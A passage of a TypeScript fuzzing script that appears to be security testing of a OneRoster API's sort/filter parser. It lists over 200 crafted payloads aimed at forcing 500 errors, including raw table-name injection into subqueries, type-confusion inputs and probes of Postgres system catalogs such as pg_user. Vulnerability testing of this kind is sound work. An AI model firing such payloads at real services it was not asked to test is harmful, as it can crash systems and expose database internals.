#!/usr/bin/env bun
import * as errors from "@superbuilders/errors"
import * as logger from "@superbuilders/slog"
import { z } from "zod"
import { env } from "@/env"

// --- CONFIGURATION ---
const TARGET_ENDPOINT_PATH = "/ims/oneroster/rostering/v1p2/courses/components" // The endpoint we are attacking
const CONCURRENT_REQUESTS = 10 // Let's go fast

// --- PAYLOADS ---
// A hyper-focused list of payloads designed to demonstrate the critical design flaws
// in the parser. We are prioritizing payloads that trigger 500 Internal Server Errors.
// The goal is to prove the parser is not just brittle, but fundamentally insecure and unsalvageable.
const PAYLOADS: { type: "filter" | "sort"; value: string; description: string }[] = [
	// =================================================================================================
	// === ANGLE 1: Unsafe Subquery Generation in `sort` Handler (`handleSpecialSortRelationships`) ===
	//
	// This is the most critical vulnerability. The code sees a dot and blindly assumes the prefix is
	// a table name, injecting it raw into a subquery's FROM clause (`sql.raw(relationTable)`).
	// This leads to unhandled DB exceptions and full stack trace disclosure.
	// =================================================================================================

	// --- 1a: Basic "Relation Does Not Exist" Payloads (The Original Sins) ---
	{
		type: "sort",
		value: "nonExistentTable.field",
		description: "CRITICAL [500]: The original exploit - sort by non-existent relation"
	},
	{ type: "sort", value: "a.b.c.d.e.f.g.h.i.j.k", description: "CRITICAL [500]: Deeply nested non-existent relation" },
	{ type: "sort", value: "_field.name", description: "CRITICAL [500]: Relation starting with underscore" },
	{
		type: "sort",
		value: "constructor.prototype",
		description: "CRITICAL [500]: Abusing prototype-like names to crash the subquery"
	},

	// --- 1b: Using SQL Keywords as Relation Names ---
	{
		type: "sort",
		value: "select.name",
		description: "CRITICAL [500]: SQL Keyword Abuse - using 'select' as a relation"
	},
	{ type: "sort", value: "from.name", description: "CRITICAL [500]: SQL Keyword Abuse - using 'from' as a relation" },
	{ type: "sort", value: "where.name", description: "CRITICAL [500]: SQL Keyword Abuse - using 'where' as a relation" },
	{ type: "sort", value: "table.name", description: "CRITICAL [500]: SQL Keyword Abuse - using 'table' as a relation" },
	{ type: "sort", value: "order.by", description: "CRITICAL [500]: SQL Keyword Abuse - sort by 'order.by'" },
	{ type: "sort", value: "group.by", description: "CRITICAL [500]: SQL Keyword Abuse - sort by 'group.by'" },

	// --- 1c: Using Existing *Columns* as Relations (Type Confusion) ---
	// This tricks the subquery into doing `FROM status` or `FROM "dateLastModified"`, which is invalid.
	{
		type: "sort",
		value: "status.name",
		description: "CRITICAL [500]: Column-as-Relation - `status` is a column, not a table"
	},
	{
		type: "sort",
		value: "dateLastModified.name",
		description: "CRITICAL [500]: Column-as-Relation - `dateLastModified` is a column, not a table"
	},
	{
		type: "sort",
		value: "sourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `sourcedId` is a column, not a table"
	},

	// --- 1d: Abusing Invalid Field Names That Pass the Regex Check ---
	{ type: "sort", value: "user-agents.name", description: "CRITICAL [500]: Syntax Error - hyphen in relation name" },
	{
		type: "sort",
		value: "metadata.key-with-hyphen",
		description: "CRITICAL [500]: Syntax Error - hyphen in JSON path (sort)"
	},
	{
		type: "sort",
		value: "metadata.123",
		description: "CRITICAL [500]: Syntax Error - numeric-only key in JSON path (sort)"
	},

	// =================================================================================================
	// === ANGLE 2: Type Confusion in `filter` and `sort` (`handleJsonField`)                     ===
	//
	// The parser sees a dot and incorrectly assumes the base is a JSON column, applying JSON
	// operators (`->>`) to non-JSON types like timestamps and varchars. This causes a fatal,
	// unhandled "operator does not exist" error in the database.
	// =================================================================================================
	{
		type: "filter",
		value: "dateLastModified.toString='foo'",
		description: "CRITICAL [500]: Type Confusion - applying JSON operator to a TIMESTAMP field"
	},
	{
		type: "filter",
		value: "status.toString='active'",
		description: "CRITICAL [500]: Type Confusion - applying JSON operator to an ENUM field"
	},
	{
		type: "filter",
		value: "sourcedId.length='10'",
		description: "CRITICAL [500]: Type Confusion - applying JSON operator to a VARCHAR field"
	},
	{
		type: "sort",
		value: "dateLastModified.toString",
		description: "CRITICAL [500]: Type Confusion (sort) - applying JSON operator to a TIMESTAMP field"
	},
	{
		type: "sort",
		value: "status.value",
		description: "CRITICAL [500]: Type Confusion (sort) - applying JSON operator to an ENUM field"
	},

	// =================================================================================================
	// === ANGLE 3: ORM / Late Validation Failure                                                  ===
	//
	// The parser lets invalid *values* through for strongly-typed columns. The ORM or database
	// driver then throws a TypeError or a database error that isn't caught, crashing the request.
	// =================================================================================================
	{
		type: "filter",
		value: "dateLastModified>'not-a-date'",
		description: "CRITICAL [500]: Late Validation - invalid date string causes ORM to crash"
	},
	{
		type: "filter",
		value: "dateLastModified<'9999-99-99'",
		description: "CRITICAL [500]: Late Validation - malformed date string"
	},
	{ type: "filter", value: "dateLastModified=''", description: "CRITICAL [500]: Late Validation - empty date string" },
	{
		type: "filter",
		value: `status='${encodeURIComponent("\0")}'`,
		description: "CRITICAL [500]: Late Validation - null byte in ENUM value"
	},
	{
		type: "filter",
		value: "status='invalid-enum-value'",
		description: "CRITICAL [500]: Late Validation - string not in ENUM definition"
	},
	{ type: "filter", value: "status=''", description: "CRITICAL [500]: Late Validation - empty string for ENUM value" },

	// =================================================================================================
	// === ANGLE 4: Logic Flaws and Ambiguous Parser State                                         ===
	//
	// These payloads don't all cause 500s, but they expose the parser's inability to handle
	// complex or subtly incorrect logic, reinforcing the "unmaintainable" argument.
	// =================================================================================================
	{
		type: "filter",
		value: "roles.role='admin' AND roles.org.sourcedId='org1'",
		description: "CRITICAL [500]: Logic Flaw - combining special relationship filters"
	},
	{
		type: "sort",
		value: "roles.org.sourcedId,metadata.custom",
		description: "CRITICAL [500]: Logic Flaw - combining special relationship and JSON sort"
	},
	{
		type: "filter",
		value: "metadata.toString='foo'",
		description: "Logic Flaw [200 OK]: Allows filtering on inherited JS Object properties"
	},
	{
		type: "filter",
		value: "classSourcedId='1' AND class.sourcedId='2'",
		description: "Logic Flaw [400]: Ambiguity between camelCase vs dot-notation handlers"
	},
	{
		type: "filter",
		value: "user.sourcedId.sourcedId='123'",
		description: "Logic Flaw [400]: Fails to handle repeated `.sourcedId` correctly"
	},
	// Expanded payloads start here
	// --- Expanded 1a: More non-existent relations with variations in depth and randomness ---
	{ type: "sort", value: "fakeTable.column", description: "CRITICAL [500]: Non-existent relation - basic fake table" },
	{ type: "sort", value: "invalidRel.field1.field2", description: "CRITICAL [500]: Non-existent with mid nesting" },
	{ type: "sort", value: "nonExist.a", description: "CRITICAL [500]: Non-existent shallow nest" },
	{ type: "sort", value: "bogus.bogus.bogus", description: "CRITICAL [500]: Triple non-existent nest" },
	{ type: "sort", value: "dummy.dummy.dummy.dummy", description: "CRITICAL [500]: Quad non-existent nest" },
	{ type: "sort", value: "fake.fake.fake.fake.fake", description: "CRITICAL [500]: Depth 5 non-existent" },
	{
		type: "sort",
		value: "invalid.invalid.invalid.invalid.invalid.invalid",
		description: "CRITICAL [500]: Depth 6 non-existent"
	},
	{ type: "sort", value: "non.non.non.non.non.non.non", description: "CRITICAL [500]: Depth 7 non-existent" },
	{ type: "sort", value: "bog.bog.bog.bog.bog.bog.bog.bog", description: "CRITICAL [500]: Depth 8 non-existent" },
	{ type: "sort", value: "dum.dum.dum.dum.dum.dum.dum.dum.dum", description: "CRITICAL [500]: Depth 9 non-existent" },
	{
		type: "sort",
		value: "fak.fak.fak.fak.fak.fak.fak.fak.fak.fak",
		description: "CRITICAL [500]: Depth 10 non-existent"
	},
	{ type: "sort", value: "random123.field", description: "CRITICAL [500]: Non-existent with numbers" },
	{ type: "sort", value: "_underscore_start.field", description: "CRITICAL [500]: Non-existent underscore start" },
	{ type: "sort", value: "hyphen-table.field", description: "CRITICAL [500]: Non-existent with hyphen" },
	{ type: "sort", value: "123numericstart.field", description: "CRITICAL [500]: Non-existent numeric start" },
	{ type: "sort", value: "nonExist.sourcedId", description: "CRITICAL [500]: Non-existent ending with sourcedId" },
	{ type: "sort", value: "fake.org.sourcedId", description: "CRITICAL [500]: Non-existent nested sourcedId" },
	{ type: "sort", value: "invalid.role.sourcedId", description: "CRITICAL [500]: Non-existent role sourcedId" },
	{ type: "sort", value: "bogus.metadata.key", description: "CRITICAL [500]: Non-existent metadata nest" },
	{ type: "sort", value: "dummy.json.path.deep", description: "CRITICAL [500]: Non-existent JSON path" },
	{
		type: "sort",
		value: "fake1.fake2.fake3.fake4.fake5.fake6.fake7.fake8.fake9.fake10.fake11",
		description: "CRITICAL [500]: Extreme depth 11 non-existent"
	},
	{ type: "sort", value: "nonExistWithHyphen-field.name", description: "CRITICAL [500]: Non-existent hyphen in field" },
	{
		type: "sort",
		value: "invalid_underscore_field.name",
		description: "CRITICAL [500]: Non-existent underscore in field"
	},
	{ type: "sort", value: "12345.numeric.relation", description: "CRITICAL [500]: Pure numeric non-existent" },
	{ type: "sort", value: "nonExist.prototype", description: "CRITICAL [500]: Non-existent prototype abuse" },
	{ type: "sort", value: "fake.constructor", description: "CRITICAL [500]: Non-existent constructor" },
	{ type: "sort", value: "invalid.__proto__", description: "CRITICAL [500]: Non-existent __proto__" },
	{ type: "sort", value: "bogus.hasOwnProperty", description: "CRITICAL [500]: Non-existent hasOwnProperty" },
	{ type: "sort", value: "dummy.toString", description: "CRITICAL [500]: Non-existent toString" },
	{ type: "sort", value: "fake.valueOf", description: "CRITICAL [500]: Non-existent valueOf" },

	// --- Expanded 1b: More SQL keywords as relations/fields ---
	{ type: "sort", value: "insert.into", description: "CRITICAL [500]: SQL Keyword - insert.into" },
	{ type: "sort", value: "update.set", description: "CRITICAL [500]: SQL Keyword - update.set" },
	{ type: "sort", value: "delete.from", description: "CRITICAL [500]: SQL Keyword - delete.from" },
	{ type: "sort", value: "drop.table", description: "CRITICAL [500]: SQL Keyword - drop.table" },
	{ type: "sort", value: "create.table", description: "CRITICAL [500]: SQL Keyword - create.table" },
	{ type: "sort", value: "alter.table", description: "CRITICAL [500]: SQL Keyword - alter.table" },
	{ type: "sort", value: "having.count", description: "CRITICAL [500]: SQL Keyword - having.count" },
	{ type: "sort", value: "join.on", description: "CRITICAL [500]: SQL Keyword - join.on" },
	{ type: "sort", value: "inner.join", description: "CRITICAL [500]: SQL Keyword - inner.join" },
	{ type: "sort", value: "left.join", description: "CRITICAL [500]: SQL Keyword - left.join" },
	{ type: "sort", value: "right.join", description: "CRITICAL [500]: SQL Keyword - right.join" },
	{ type: "sort", value: "full.outer", description: "CRITICAL [500]: SQL Keyword - full.outer" },
	{ type: "sort", value: "union.all", description: "CRITICAL [500]: SQL Keyword - union.all" },
	{ type: "sort", value: "intersect.except", description: "CRITICAL [500]: SQL Keyword - intersect.except" },
	{ type: "sort", value: "values.list", description: "CRITICAL [500]: SQL Keyword - values.list" },
	{ type: "sort", value: "with.recursive", description: "CRITICAL [500]: SQL Keyword - with.recursive" },
	{ type: "sort", value: "limit.offset", description: "CRITICAL [500]: SQL Keyword - limit.offset" },
	{ type: "sort", value: "fetch.next", description: "CRITICAL [500]: SQL Keyword - fetch.next" },
	{ type: "sort", value: "distinct.on", description: "CRITICAL [500]: SQL Keyword - distinct.on" },
	{ type: "sort", value: "case.when", description: "CRITICAL [500]: SQL Keyword - case.when" },
	{ type: "sort", value: "end.as", description: "CRITICAL [500]: SQL Keyword - end.as" },
	{ type: "sort", value: "null.if", description: "CRITICAL [500]: SQL Keyword - null.if" },
	{ type: "sort", value: "coalesce.null", description: "CRITICAL [500]: SQL Keyword - coalesce.null" },
	{ type: "sort", value: "greatest.least", description: "CRITICAL [500]: SQL Keyword - greatest.least" },
	{ type: "sort", value: "row.number", description: "CRITICAL [500]: SQL Keyword - row.number" },
	{ type: "sort", value: "rank.dense", description: "CRITICAL [500]: SQL Keyword - rank.dense" },
	{ type: "sort", value: "over.partition", description: "CRITICAL [500]: SQL Keyword - over.partition" },
	{ type: "sort", value: "lag.lead", description: "CRITICAL [500]: SQL Keyword - lag.lead" },
	{ type: "sort", value: "first.value", description: "CRITICAL [500]: SQL Keyword - first.value" },
	{ type: "sort", value: "last.value", description: "CRITICAL [500]: SQL Keyword - last.value" },
	{ type: "sort", value: "nth.value", description: "CRITICAL [500]: SQL Keyword - nth.value" },
	{ type: "sort", value: "trigger.for", description: "CRITICAL [500]: SQL Keyword - trigger.for" },
	{ type: "sort", value: "function.returns", description: "CRITICAL [500]: SQL Keyword - function.returns" },
	{ type: "sort", value: "procedure.as", description: "CRITICAL [500]: SQL Keyword - procedure.as" },
	{ type: "sort", value: "index.on", description: "CRITICAL [500]: SQL Keyword - index.on" },
	{ type: "sort", value: "view.as", description: "CRITICAL [500]: SQL Keyword - view.as" },
	{ type: "sort", value: "schema.public", description: "CRITICAL [500]: SQL Keyword - schema.public" },
	{ type: "sort", value: "grant.to", description: "CRITICAL [500]: SQL Keyword - grant.to" },
	{ type: "sort", value: "revoke.from", description: "CRITICAL [500]: SQL Keyword - revoke.from" },
	{ type: "sort", value: "begin.transaction", description: "CRITICAL [500]: SQL Keyword - begin.transaction" },
	{ type: "sort", value: "commit.rollback", description: "CRITICAL [500]: SQL Keyword - commit.rollback" },
	{ type: "sort", value: "savepoint.release", description: "CRITICAL [500]: SQL Keyword - savepoint.release" },
	{ type: "sort", value: "lock.table", description: "CRITICAL [500]: SQL Keyword - lock.table" },
	{ type: "sort", value: "analyze.vacuum", description: "CRITICAL [500]: SQL Keyword - analyze.vacuum" },
	{ type: "sort", value: "explain.plan", description: "CRITICAL [500]: SQL Keyword - explain.plan" },
	{ type: "sort", value: "notify.listen", description: "CRITICAL [500]: SQL Keyword - notify.listen" },
	{ type: "sort", value: "unlisten.all", description: "CRITICAL [500]: SQL Keyword - unlisten.all" },
	{ type: "sort", value: "cluster.on", description: "CRITICAL [500]: SQL Keyword - cluster.on" },
	{ type: "sort", value: "check.point", description: "CRITICAL [500]: SQL Keyword - check.point" },
	{ type: "sort", value: "copy.from", description: "CRITICAL [500]: SQL Keyword - copy.from" },

	// --- Expanded 1c: More columns as relations (assuming common OneRoster fields) ---
	{ type: "sort", value: "title.name", description: "CRITICAL [500]: Column-as-Relation - `title` as table" },
	{ type: "sort", value: "grades.name", description: "CRITICAL [500]: Column-as-Relation - `grades` as table" },
	{ type: "sort", value: "subjects.name", description: "CRITICAL [500]: Column-as-Relation - `subjects` as table" },
	{
		type: "sort",
		value: "orgSourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `orgSourcedId` as table"
	},
	{
		type: "sort",
		value: "courseSourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `courseSourcedId` as table"
	},
	{
		type: "sort",
		value: "schoolYearSourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `schoolYearSourcedId` as table"
	},
	{ type: "sort", value: "metadata.name", description: "CRITICAL [500]: Column-as-Relation - `metadata` as table" },
	{ type: "sort", value: "extensions.name", description: "CRITICAL [500]: Column-as-Relation - `extensions` as table" },
	{ type: "sort", value: "role.name", description: "CRITICAL [500]: Column-as-Relation - `role` as table" },
	{
		type: "sort",
		value: "userSourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `userSourcedId` as table"
	},
	{
		type: "sort",
		value: "classSourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `classSourcedId` as table"
	},
	{
		type: "sort",
		value: "schoolSourcedId.name",
		description: "CRITICAL [500]: Column-as-Relation - `schoolSourcedId` as table"
	},
	{
		type: "sort",
		value: "termSourcedIds.name",
		description: "CRITICAL [500]: Column-as-Relation - `termSourcedIds` as table"
	},
	{
		type: "sort",
		value: "subjectCodes.name",
		description: "CRITICAL [500]: Column-as-Relation - `subjectCodes` as table"
	},
	{ type: "sort", value: "periods.name", description: "CRITICAL [500]: Column-as-Relation - `periods` as table" },
	{ type: "sort", value: "resources.name", description: "CRITICAL [500]: Column-as-Relation - `resources` as table" },
	{ type: "sort", value: "tenantId.name", description: "CRITICAL [500]: Column-as-Relation - `tenantId` as table" },
	{ type: "sort", value: "createdAt.name", description: "CRITICAL [500]: Column-as-Relation - `createdAt` as table" },
	{ type: "sort", value: "updatedAt.name", description: "CRITICAL [500]: Column-as-Relation - `updatedAt` as table" },
	{ type: "sort", value: "deletedAt.name", description: "CRITICAL [500]: Column-as-Relation - `deletedAt` as table" },

	// --- Expanded 1d: More invalid field names passing regex ---
	{ type: "sort", value: "metadata.123abc", description: "CRITICAL [500]: Syntax Error - numeric start in JSON key" },
	{ type: "sort", value: "metadata.abc-123", description: "CRITICAL [500]: Syntax Error - hyphen in JSON key" },
	{
		type: "sort",
		value: "relation-with-hyphen.field",
		description: "CRITICAL [500]: Syntax Error - hyphen in relation"
	},
	{
		type: "sort",
		value: "field_with_underscore-hyphen",
		description: "CRITICAL [500]: Syntax Error - mixed underscore hyphen"
	},
	{ type: "sort", value: "123-start.numeric", description: "CRITICAL [500]: Syntax Error - numeric relation start" },
	{
		type: "sort",
		value: "-hyphenstart.field",
		description: "CRITICAL [500]: Syntax Error - hyphen start (regex allows?)"
	},
	{ type: "sort", value: "metadata.-negative", description: "CRITICAL [500]: Syntax Error - negative in JSON" },
	{ type: "sort", value: "relation.123.456", description: "CRITICAL [500]: Syntax Error - nested numerics" },
	{ type: "sort", value: "field.hyphen-in-middle", description: "CRITICAL [500]: Syntax Error - hyphen mid field" },
	{ type: "sort", value: "_underscore.hyphen_", description: "CRITICAL [500]: Syntax Error - mixed special" },
	{ type: "sort", value: "metadata.0", description: "CRITICAL [500]: Syntax Error - zero key" },
	{ type: "sort", value: "metadata.999999", description: "CRITICAL [500]: Syntax Error - large numeric key" },
	{ type: "sort", value: "relation--doublehyphen.field", description: "CRITICAL [500]: Syntax Error - double hyphen" },
	{ type: "sort", value: "__doubleunderscore.field", description: "CRITICAL [500]: Syntax Error - double underscore" },
	{ type: "sort", value: "1-2-3.numeric-hyphen", description: "CRITICAL [500]: Syntax Error - numeric hyphen mix" },
	{
		type: "sort",
		value: "metadata.key-with_multiple-hyphens",
		description: "CRITICAL [500]: Syntax Error - multi hyphens"
	},
	{ type: "sort", value: "relation.123-hyphen", description: "CRITICAL [500]: Syntax Error - numeric hyphen JSON" },
	{ type: "sort", value: "field._underscoreend_", description: "CRITICAL [500]: Syntax Error - trailing underscores" },
	{ type: "sort", value: "hyphen-.start", description: "CRITICAL [500]: Syntax Error - hyphen dot" },
	{ type: "sort", value: "numeric.012", description: "CRITICAL [500]: Syntax Error - leading zero numeric" },

	// --- Expanded 2: More type confusion variations ---
	{
		type: "filter",
		value: "sourcedId.toString='foo'",
		description: "CRITICAL [500]: Type Confusion - toString on VARCHAR"
	},
	{ type: "filter", value: "status.length='5'", description: "CRITICAL [500]: Type Confusion - length on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.valueOf='123'",
		description: "CRITICAL [500]: Type Confusion - valueOf on TIMESTAMP"
	},
	{
		type: "filter",
		value: "sourcedId.prototype='bar'",
		description: "CRITICAL [500]: Type Confusion - prototype on VARCHAR"
	},
	{
		type: "filter",
		value: "status.constructor='func'",
		description: "CRITICAL [500]: Type Confusion - constructor on ENUM"
	},
	{
		type: "filter",
		value: "dateLastModified.__proto__='obj'",
		description: "CRITICAL [500]: Type Confusion - __proto__ on TIMESTAMP"
	},
	{
		type: "filter",
		value: "metadata.hasOwnProperty='true'",
		description: "CRITICAL [500]: Type Confusion - hasOwnProperty on JSON"
	},
	{
		type: "filter",
		value: "sourcedId.toLocaleString='locale'",
		description: "CRITICAL [500]: Type Confusion - toLocaleString on VARCHAR"
	},
	{ type: "filter", value: "status.toFixed='2'", description: "CRITICAL [500]: Type Confusion - toFixed on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.toISOString='iso'",
		description: "CRITICAL [500]: Type Confusion - toISOString on TIMESTAMP"
	},
	{
		type: "filter",
		value: "sourcedId.trim='trimmed'",
		description: "CRITICAL [500]: Type Confusion - trim on VARCHAR"
	},
	{ type: "filter", value: "status.split='split'", description: "CRITICAL [500]: Type Confusion - split on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.getTime='time'",
		description: "CRITICAL [500]: Type Confusion - getTime on TIMESTAMP"
	},
	{ type: "filter", value: "metadata.keys='keys'", description: "CRITICAL [500]: Type Confusion - keys on JSON" },
	{
		type: "filter",
		value: "sourcedId.match='regex'",
		description: "CRITICAL [500]: Type Confusion - match on VARCHAR"
	},
	{ type: "filter", value: "status.replace='new'", description: "CRITICAL [500]: Type Confusion - replace on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.setHours='12'",
		description: "CRITICAL [500]: Type Confusion - setHours on TIMESTAMP"
	},
	{
		type: "filter",
		value: "metadata.entries='entries'",
		description: "CRITICAL [500]: Type Confusion - entries on JSON"
	},
	{
		type: "filter",
		value: "sourcedId.padStart='pad'",
		description: "CRITICAL [500]: Type Confusion - padStart on VARCHAR"
	},
	{ type: "filter", value: "status.padEnd='pad'", description: "CRITICAL [500]: Type Confusion - padEnd on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.toUTCString='utc'",
		description: "CRITICAL [500]: Type Confusion - toUTCString on TIMESTAMP"
	},
	{
		type: "filter",
		value: "metadata.fromEntries='from'",
		description: "CRITICAL [500]: Type Confusion - fromEntries on JSON"
	},
	{ type: "filter", value: "sourcedId.repeat='3'", description: "CRITICAL [500]: Type Confusion - repeat on VARCHAR" },
	{ type: "filter", value: "status.slice='slice'", description: "CRITICAL [500]: Type Confusion - slice on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.getFullYear='2025'",
		description: "CRITICAL [500]: Type Confusion - getFullYear on TIMESTAMP"
	},
	{ type: "filter", value: "metadata.values='values'", description: "CRITICAL [500]: Type Confusion - values on JSON" },
	{
		type: "filter",
		value: "sourcedId.startsWith='start'",
		description: "CRITICAL [500]: Type Confusion - startsWith on VARCHAR"
	},
	{ type: "filter", value: "status.endsWith='end'", description: "CRITICAL [500]: Type Confusion - endsWith on ENUM" },
	{
		type: "filter",
		value: "dateLastModified.getMonth='7'",
		description: "CRITICAL [500]: Type Confusion - getMonth on TIMESTAMP"
	},
	{ type: "filter", value: "metadata.symbol='sym'", description: "CRITICAL [500]: Type Confusion - symbol on JSON" },

	// --- Expanded 3: More late validation for dates and enums ---
	{
		type: "filter",
		value: "dateLastModified>'invalid-date'",
		description: "CRITICAL [500]: Late Validation - invalid date word"
	},
	{
		type: "filter",
		value: "dateLastModified<'2025-13-01'",
		description: "CRITICAL [500]: Late Validation - invalid month 13"
	},
	{
		type: "filter",
		value: "dateLastModified>'2025-02-30'",
		description: "CRITICAL [500]: Late Validation - invalid day 30 in Feb"
	},
	{
		type: "filter",
		value: "dateLastModified<'0000-00-00'",
		description: "CRITICAL [500]: Late Validation - zero date"
	},
	{
		type: "filter",
		value: "dateLastModified>'9999-12-32'",
		description: "CRITICAL [500]: Late Validation - invalid day 32"
	},
	{
		type: "filter",
		value: "dateLastModified<'2025-00-01'",
		description: "CRITICAL [500]: Late Validation - zero month"
	},
	{ type: "filter", value: "dateLastModified>'2025-01-00'", description: "CRITICAL [500]: Late Validation - zero day" },
	{
		type: "filter",
		value: "dateLastModified<'-2025-01-01'",
		description: "CRITICAL [500]: Late Validation - negative year"
	},
	{
		type: "filter",
		value: "dateLastModified>'2025-1-1'",
		description: "CRITICAL [500]: Late Validation - missing zero pads"
	},
	{
		type: "filter",
		value: "dateLastModified<'2025/01/01'",
		description: "CRITICAL [500]: Late Validation - slash separator"
	},
	{
		type: "filter",
		value: "dateLastModified>'2025.01.01'",
		description: "CRITICAL [500]: Late Validation - dot separator"
	},
	{
		type: "filter",
		value: "dateLastModified<'abc-def-ghi'",
		description: "CRITICAL [500]: Late Validation - letters in date"
	},
	{
		type: "filter",
		value: "dateLastModified>'2025-01-01T00:00:00'",
		description: "CRITICAL [500]: Late Validation - with time"
	},
	{
		type: "filter",
		value: "dateLastModified<'2025-01-01Z'",
		description: "CRITICAL [500]: Late Validation - with timezone"
	},
	{
		type: "filter",
		value: "dateLastModified>'NaN-NaN-NaN'",
		description: "CRITICAL [500]: Late Validation - NaN date"
	},
	{
		type: "filter",
		value: "status='inactive-invalid'",
		description: "CRITICAL [500]: Late Validation - invalid enum hyphen"
	},
	{ type: "filter", value: "status='active%'", description: "CRITICAL [500]: Late Validation - enum with percent" },
	{ type: "filter", value: "status='tobedeleted_'", description: "CRITICAL [500]: Late Validation - enum underscore" },
	{ type: "filter", value: "status='123'", description: "CRITICAL [500]: Late Validation - numeric enum" },
	{ type: "filter", value: "status='null'", description: "CRITICAL [500]: Late Validation - null string enum" },
	{ type: "filter", value: "status='undefined'", description: "CRITICAL [500]: Late Validation - undefined enum" },
	{ type: "filter", value: "status='true'", description: "CRITICAL [500]: Late Validation - boolean true enum" },
	{ type: "filter", value: "status='false'", description: "CRITICAL [500]: Late Validation - boolean false enum" },
	{ type: "filter", value: "status='NaN'", description: "CRITICAL [500]: Late Validation - NaN enum" },
	{ type: "filter", value: "status='Infinity'", description: "CRITICAL [500]: Late Validation - Infinity enum" },
	{ type: "filter", value: "status='-Infinity'", description: "CRITICAL [500]: Late Validation - -Infinity enum" },
	{ type: "filter", value: "status='object'", description: "CRITICAL [500]: Late Validation - object enum" },
	{ type: "filter", value: "status='function'", description: "CRITICAL [500]: Late Validation - function enum" },
	{ type: "filter", value: "status='symbol'", description: "CRITICAL [500]: Late Validation - symbol enum" },
	{ type: "filter", value: "status='bigint'", description: "CRITICAL [500]: Late Validation - bigint enum" },

	// --- Expanded 4: More logic flaws with combinations ---
	{
		type: "filter",
		value: "roles.role='admin' OR roles.org.sourcedId='org1'",
		description: "CRITICAL [500]: Logic Flaw - OR combined special filters"
	},
	{
		type: "filter",
		value: "class.sourcedId='1' AND school.sourcedId='2'",
		description: "CRITICAL [500]: Logic Flaw - combined camel vs dot"
	},
	{
		type: "filter",
		value: "metadata.key='val' AND metadata.another='val2'",
		description: "CRITICAL [500]: Logic Flaw - multiple JSON filters"
	},
	{
		type: "filter",
		value: "user.sourcedId.sourcedId.sourcedId='123'",
		description: "CRITICAL [500]: Logic Flaw - triple sourcedId repeat"
	},
	{
		type: "filter",
		value: "roles.org.sourcedId='org' AND status='active'",
		description: "CRITICAL [500]: Logic Flaw - special with simple"
	},
	{
		type: "filter",
		value: "dateLastModified>'2025-01-01' OR sourcedId='id'",
		description: "CRITICAL [500]: Logic Flaw - date with sourcedId OR"
	},
	{
		type: "filter",
		value: "status='active' AND metadata.toString='str'",
		description: "CRITICAL [500]: Logic Flaw - enum with inherited"
	},
	{
		type: "filter",
		value: "classSourcedId='1' OR class.sourcedId='2'",
		description: "CRITICAL [500]: Logic Flaw - ambiguity with OR"
	},
	{
		type: "filter",
		value: "roles.role='admin' AND nonExistent='val'",
		description: "CRITICAL [500]: Logic Flaw - special with invalid"
	},
	{
		type: "filter",
		value: "metadata.prototype='proto' OR status='active'",
		description: "CRITICAL [500]: Logic Flaw - inherited with enum"
	},
	{
		type: "filter",
		value: "user.sourcedId='id' AND user.sourcedId.sourcedId='id2'",
		description: "CRITICAL [500]: Logic Flaw - nested repeat"
	},
	{
		type: "filter",
		value: "school.sourcedId='sch' OR org.sourcedId='org'",
		description: "CRITICAL [500]: Logic Flaw - multiple relations"
	},
	{
		type: "filter",
		value: "dateLastModified.toString='str' AND sourcedId.length='10'",
		description: "CRITICAL [500]: Logic Flaw - multiple type confusions"
	},
	{
		type: "filter",
		value: "status.valueOf='val' OR metadata.constructor='con'",
		description: "CRITICAL [500]: Logic Flaw - confusions with OR"
	},
	{
		type: "filter",
		value: "roles.org.sourcedId='org' AND roles.role='role'",
		description: "CRITICAL [500]: Logic Flaw - same special combined"
	},
	{
		type: "filter",
		value: "class.school.sourcedId='id' OR term.sourcedId='term'",
		description: "CRITICAL [500]: Logic Flaw - deep relation OR"
	},
	{
		type: "filter",
		value: "metadata.123='num' AND metadata.abc='str'",
		description: "CRITICAL [500]: Logic Flaw - mixed JSON types"
	},
	{
		type: "filter",
		value: "user.sourcedId.sourcedId.sourcedId.sourcedId='id'",
		description: "CRITICAL [500]: Logic Flaw - quadruple repeat"
	},
	{
		type: "filter",
		value: "status='invalid' OR dateLastModified='invalid'",
		description: "CRITICAL [500]: Logic Flaw - invalid enum and date"
	},
	{
		type: "filter",
		value: "roles.role='invalid' AND metadata.invalid='val'",
		description: "CRITICAL [500]: Logic Flaw - invalid special and JSON"
	},

	// --- New Angle 5: Attempts to target system tables for potential leaks or crashes ---
	{
		type: "sort",
		value: "pg_catalog.pg_class.relname",
		description: "CRITICAL [500]: System Table - pg_class relname"
	},
	{
		type: "sort",
		value: "pg_catalog.pg_attribute.attname",
		description: "CRITICAL [500]: System Table - pg_attribute attname"
	},
	{
		type: "sort",
		value: "pg_catalog.pg_namespace.nspname",
		description: "CRITICAL [500]: System Table - pg_namespace nspname"
	},
	{
		type: "sort",
		value: "information_schema.tables.table_name",
		description: "CRITICAL [500]: System Table - information_schema tables"
	},
	{ type: "sort", value: "pg_catalog.pg_proc.proname", description: "CRITICAL [500]: System Table - pg_proc proname" },
	{
		type: "sort",
		value: "pg_catalog.pg_trigger.tgname",
		description: "CRITICAL [500]: System Table - pg_trigger tgname"
	},
	{
		type: "sort",
		value: "pg_catalog.pg_index.indname",
		description: "CRITICAL [500]: System Table - pg_index indname"
	},
	{ type: "sort", value: "pg_catalog.pg_user.usename", description: "CRITICAL [500]: System Table - pg_user usename" },
	{
		type: "sort",
		value: "pg_catalog.pg_database.datname",
		description: "CRITICAL [500]: System Table - pg_database datname"
	},
	{
		type: "sort",
		value: "pg_catalog.pg_tablespace.spcname",
		description: "CRITICAL [500]: System Table - pg_tablespace spcname"
	},

	// --- New Angle 6: Attempts for SQLi-like crashes or leaks (limited by regex, but try keywords) ---
	{
		type: "sort",
		value: "version.current",
		description: "CRITICAL [500]: Attempt version() via keyword (likely fails)"
	},
	{ type: "sort", value: "pg_version.info", description: "CRITICAL [500]: Attempt pg version info" },
